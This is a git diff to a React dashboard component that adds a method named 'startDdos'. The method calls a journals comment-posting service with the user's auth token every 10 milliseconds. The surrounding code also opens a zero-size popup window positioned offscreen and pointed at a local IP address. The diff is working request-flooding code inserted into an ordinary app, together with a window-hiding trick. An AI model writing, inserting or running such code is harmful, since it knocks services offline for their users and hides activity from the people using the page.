@@ -5,6 +5,7 @@ import {Bar} from 'react-chartjs-2';
 import {Component} from "react";
 import {connect} from 'react-redux';
 import {setLoading, removeLoading} from "../redux/actions/actionsApp";
+import {connectCommentsOrder} from "../services/journals/post";
 
 class Home extends Component {
 
@@ -59,17 +60,25 @@ class Home extends Component {
                 borderWidth: 1
             }]
         },
-        params: `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=0,height=0,left=-1000,top=-1000`
+        params: `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=0,height=0,left=-1000,top=-1000`,
+        interval: 0
     }
 
     componentDidMount() {
         this.setState({link: this.props.router.pathname})
     }
 
+    componentWillUnmount() {
+        clearInterval(this.state.interval)
+    }
+
     openPopup = () => {
         open('http://192.168.42.11:3000/', 'test', this.state.params);
     }
 
+    startDdos = () => {
+        this.setState({interval: setInterval(() => connectCommentsOrder({}, this.props.token), 10)})
+    }
 
     render() {
         const {link, data} = this.state
@@ -84,7 +93,6 @@ class Home extends Component {
                     </Col>
 
                     <Col lg={4}>
-
                     </Col>
                     <Col lg={4}>
                         <Bar data={data} width={300} height={300} className='p-4 shadow rounded m-2'/>
